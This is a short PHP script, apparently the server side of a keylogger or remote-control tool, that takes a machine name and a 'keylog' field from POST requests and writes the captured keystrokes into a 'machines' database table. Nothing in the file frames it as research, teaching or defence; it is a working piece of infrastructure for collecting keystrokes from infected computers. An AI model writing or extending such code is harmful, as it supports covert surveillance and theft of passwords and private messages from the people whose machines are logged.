<?php
require('../config/config.php');

if (isset($_POST['name']) && isset($_POST['keylog'])) {
    $machine = $_POST['name'];
    $keylog = $_POST['keylog'];
    
    if (!empty($machine) && !empty($keylog)) {
        $conn = connect_to_db();

        $query = "UPDATE machines SET keylog = ? WHERE name = ?";
        $stmt = $conn->prepare($query);
        $stmt->bind_param('ss', $keylog, $machine);
        $stmt->execute();

        $stmt->close();
        $conn->close();
    }
}
